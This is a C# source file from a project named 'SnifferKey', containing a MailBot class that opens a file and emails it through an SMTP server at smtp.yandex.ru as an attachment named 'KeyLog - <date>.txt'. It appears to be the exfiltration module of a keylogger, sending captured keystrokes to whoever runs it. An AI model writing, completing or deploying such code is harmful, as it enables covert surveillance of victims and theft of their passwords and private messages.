using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;

namespace SnifferKey
{
    class MailBot
    {
        private readonly MailMessage mailMessage;
        private readonly SmtpClient smtpClient;

        public MailBot(string username, string pass, string from, string[] to, string subject)
        {
            smtpClient = new SmtpClient("smtp.yandex.ru", 587);
            smtpClient.Credentials = new NetworkCredential(username, pass);
            smtpClient.EnableSsl = true;

            mailMessage = new MailMessage();
            mailMessage.From = new MailAddress(from);
            mailMessage.Subject = subject;
            Array.ForEach<string>(to, (x) => mailMessage.To.Add(x));
        }

        async public void SendFile(string pathFile)
        {
            FileStream fileStream = new FileStream(pathFile,
                FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            fileStream.Seek(0, SeekOrigin.Begin);
            ContentType contentType = new ContentType(MediaTypeNames.Text.Plain);
            Attachment data = new Attachment(fileStream, contentType);
            ContentDisposition disposition = data.ContentDisposition;
            disposition.FileName = string.Format(
                "KeyLog - {0}.txt", DateTime.Now.ToString());

            mailMessage.Attachments.Add(data);

            await smtpClient.SendMailAsync(mailMessage);
        }
    }
}
